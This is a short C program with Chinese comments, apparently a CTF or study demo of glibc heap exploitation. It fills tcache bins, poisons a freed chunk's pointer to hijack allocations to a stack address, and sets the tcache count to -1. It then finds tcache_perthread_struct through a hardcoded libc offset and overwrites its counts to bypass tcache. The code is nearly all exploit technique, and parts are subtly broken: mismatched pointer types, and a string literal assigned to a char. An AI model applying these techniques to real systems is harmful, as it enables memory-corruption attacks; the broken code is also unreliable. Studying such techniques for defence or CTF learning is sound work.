#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c0+0x8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{   
    // 释放 7 个同样大小的 tcache 填满对应位置的tcache  bin。
    size_t chunkarray[0x10];
    for(int i=0;i<0x8;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    for(int i=0;i<0x8;i++)
    {
        free(chunkarray[i]);  //chunkarray[7] in fastbin
    }
    //释放不在 tcache 大小范围的 chunk。
    size_t* chunk1=malloc(0x410); //smallest
    malloc(0x20); //padding and size not frome tcache
    free(chunk1);
    // 如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 
    size_t* chunk2=malloc(0x20);
    size_t* chunk3=malloc(0x20);
    free(chunk2);
    size_t* a;
    chunk2[0]=&a; 
    malloc(0x20);
    //bins:         0x30 [  0]: 0x7fffffffdcb8
    malloc(0x20);
    //bins:         0x30 [ -1]: 0x7ffff7ffe710
    free(chunk3);
    //控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache 。
    size_t chunk4=malloc(0x30);
    char* heap_base=getheap();
    heap_base[0x12]="7";
    free(chunk4);
    
}